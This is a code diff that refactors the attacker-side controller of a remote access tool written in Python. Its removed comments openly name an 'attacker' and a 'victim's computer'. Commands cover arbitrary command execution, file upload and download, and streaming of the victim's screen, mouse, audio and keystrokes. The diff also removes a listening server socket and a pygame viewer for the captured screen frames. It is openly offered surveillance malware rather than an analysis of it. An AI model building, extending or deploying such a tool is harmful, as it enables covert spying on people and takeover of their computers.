@@ -1,34 +1,10 @@
+import threading
 from time import sleep
 from shlex import split as shlexSplit
-import socket
-import threading
-import pygame
-
-SERVER_PORT = 8080
-
-# change directory and list directory contents
-CHANGE_DIR = 1
-LIST_DIR = 2
-# upload and download files from/to attacker
-UPLOAD = 3
-DOWNLOAD = 4
-# run an arbitrary comamnd
-RUN_CMD = 5
-# start and end video, mouse, and audio streams
-START_VIDEO = 6
-END_VIDEO = 7
-START_MOUSE = 8
-END_MOUSE = 9
-START_AUDIO = 10
-END_AUDIO = 11
-START_KEYS = 13
-END_KEYS = 14
-# end the process (on the victim's computer)
-KILL_PROC = 12
-# print the rest of the message to provide useful info
-PRINT_INFO = 15
-# inform the attacker what the current directory is
-NEW_CURR_DIR = 16
+# import my stuff
+import utils
+import gui
+from consts import *
 
 # the current directory - printed to console when expecting user input
 currDir = ""
@@ -66,37 +42,8 @@ class mainSockThread (threading.Thread):
 				currDir = str(data[1:], 'UTF-8')
 
 """
-	Create a server socket and listen for an incoming connection
-	Returns the socket associated with the connection
+	Process the command received from user input
 """
-def openConnection(portNum):
-	print(f"Listening for connection on port {portNum} ...")
-
-	# create an IPv4 TCP server socket and set it up to listen
-	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	serversocket.bind(('', portNum))
-	serversocket.listen()
-
-	# listen for incoming connections and accept them
-	(clientsocket, address) = serversocket.accept()
-	print("Connection established")
-
-	# close the server socket and return the socket associated with the connection
-	serversocket.close()
-	return clientsocket
-
-"""
-	 echo messages back to the sender
-	while True:
-		data = clientsocket.recv(4096)
-		if not data:
-			break
-		print(data)
-		data_s = b'ECHO: ' + data + b'\0'
-		print(data_s)
-		clientsocket.sendall(data_s)
-"""
-
 def handleCommand(cmd, mainSock):
 	if cmd.startswith("help"):
 		print("cd [directory] - change current directory")
@@ -176,156 +123,17 @@ def handleCommand(cmd, mainSock):
 		print("Unknown command received! Use \"help\" to list available commands")
 
 """
-	Method for testing things before fully implementing them
-	Currently testing video stream
-	TODO - delete once no longer needed
-"""
-def test(mainSock):
-	# initialize the pygame module
-	pygame.init()
-	# load and set the logo
-	pygame.display.set_caption("minimal program")
-
-	# create a surface on screen that has the size of 240 x 180
-	screen = pygame.display.set_mode((768,432), pygame.RESIZABLE)
-
-	# define a variable to control the main loop
-	running = True
-	# buffer to hold data and way to track file size
-	fileSize = 0
-	baseWidth = 0
-	baseHeight = 0
-	data = b''
-	buff = b''
-	imgBuff = b''
-	surf = None
-	dirty = False
-	frames = 0
-	# constants for panning and zooming
-	STEP_FACTOR = 20
-	ZOOM_FACTOR = 0.1
-	# values for offset and zoom
-	zoom = 1.0
-	offsetX = 0
-	offsetY = 0
-
-
-	# get the frame data (size, width, height)
-	try:
-		data = mainSock.recv(12)
-		baseWidth = int.from_bytes(data[0:4], byteorder='little', signed=True)
-		baseHeight = int.from_bytes(data[4:8], byteorder='little', signed=True)
-		fileSize = int.from_bytes(data[8:12], byteorder='little', signed=True)
-		print(f'File size is {fileSize} with resolution of {baseWidth} x {baseHeight}')
-	except Exception as inst:
-		print(type(inst))
-		print(inst.args)
-		print(inst)
-		quit()
-
-	# main loop
-	while running:
-		# get next frame
-		try:
-			data = mainSock.recv(fileSize)
-			if fileSize == 0 and len(data) >= 4:
-				fileSize = int.from_bytes(data[0:4], byteorder='big', signed=True)
-				printf(f'File size: {fileSize}')
-				imgBuff = [0 for x in range(0, fileSize)]
-				data = data[4:]
-			if len(data) > 0:
-				buff = buff + data
-			if len(buff) >= fileSize:
-				imgBuff = buff[0:fileSize]
-				surf = pygame.image.frombuffer(imgBuff, (baseWidth, baseHeight), "RGBA")
-				# do some math so the scaling keeps the same aspect ratio
-				windowSize = pygame.display.get_window_size()
-				scaledWidth = windowSize[0]
-				scaledHeight = scaledWidth * baseHeight / baseWidth # keep image ration - scaled width * image height / image width
-				if scaledHeight > windowSize[1]: # too tall for window
-					scaledWidth = scaledWidth * windowSize[1] / scaledHeight # reduce width to keep the ration
-					scaledHeight = windowSize[1]
-				scaledWidth = scaledWidth * zoom
-				scaledHeight = scaledHeight * zoom
-				surf = pygame.transform.scale(surf, (int(scaledWidth), int(scaledHeight))) # scale the image to fit the window
-				buff = buff[fileSize:]
-				dirty = True
-		except Exception as inst:
-			print(type(inst))
-			print(inst.args)
-			print(inst)
-			sleep(10)
-		if not data:
-			# TODO - connection closed
-			print("Connection closed! TODO - Exit program...")
-			quit()
-
-		#percent = int(len(buff) * 100 / fileSize)
-		#print(f'Buffer is {percent} full')
-
-		if surf != None and dirty:
-			# print what frame is being displayed - used for debug
-			print(f"Displaying frame {frames}")
-			frames += 1
-			# draw the new frame in the center of the window and update the display
-			screen.fill((0, 0, 0))
-			windowSize = pygame.display.get_window_size()
-			centerX = (windowSize[0] - surf.get_width()) // 2
-			centerY = (windowSize[1] - surf.get_height()) // 2
-			screen.blit(surf, (int(centerX + (offsetX * zoom)), int(centerY + (offsetY * zoom))))
-			pygame.display.flip()
-			dirty = False
-		elif dirty:
-			print("surf is NONE!")
-
-		#pygame.display.flip()
-
-		# event handling
-		for event in pygame.event.get():
-			if event.type == pygame.QUIT: # was the windows closed?
-				running = False
-			elif event.type == pygame.KEYDOWN:
-				if event.mod & pygame.KMOD_RCTRL: # right control is pressed down
-					dirty = True # assume that the image is mooved or resized
-					if event.key == pygame.K_UP: # move up - push image down - increase offsetY
-						offsetY = offsetY + (STEP_FACTOR * zoom)
-					elif event.key == pygame.K_DOWN:
-						offsetY = offsetY - (STEP_FACTOR * zoom)
-					elif event.key == pygame.K_LEFT: # move left - push image right - increase offsetX
-						offsetX = offsetX + (STEP_FACTOR * zoom)
-					elif event.key == pygame.K_RIGHT:
-						offsetX = offsetX - (STEP_FACTOR * zoom)
-					elif event.key == pygame.K_KP_PLUS or event.key == pygame.K_PLUS: # zoom in
-						zoom = zoom + ZOOM_FACTOR # zoom is done linearly - 100%, 110%, 120%, 130%, etc
-						surfSize = surf.get_size()
-						surf = pygame.transform.scale(surf, (int(surfSize[0] * (1 + ZOOM_FACTOR)), int(surfSize[1] * (1 + ZOOM_FACTOR))))
-					elif event.key == pygame.K_KP_MINUS or event.key == pygame.K_MINUS:
-						zoom = zoom - ZOOM_FACTOR
-						surfSize = surf.get_size()
-						surf = pygame.transform.scale(surf, (int(surfSize[0] * (1 - ZOOM_FACTOR)), int(surfSize[1] * (1 - ZOOM_FACTOR))))
-					elif event.key == pygame.K_c or event.key == pygame.K_r: # center the image and possibly reset the zoom
-						offsetX = 0
-						offsetY = 0
-						if event.key == pygame.K_r: # reset the zoom
-							zoom = 1.0
-					else: # image wasn't moved or resized - set dirty bit back to false
-						dirty = False
-
-"""
 	Run the main loop for getting user input and 
 """
 def main():
 	global currDir
 
 	# establish a connection for sending commands
-	mainSock = openConnection(SERVER_PORT)
+	mainSock = utils.openConnection(SERVER_PORT)
 
 	# start a separate thread to listen for info received on the main socket
-	#mainListenThread = mainSockThread(mainSock)
-	#mainListenThread.start()
-
-	# call to testing method
-	test(mainSock)
+	mainListenThread = mainSockThread(mainSock)
+	mainListenThread.start()
 
 	# main command loop
 	cmd = input(f"{currDir}>")
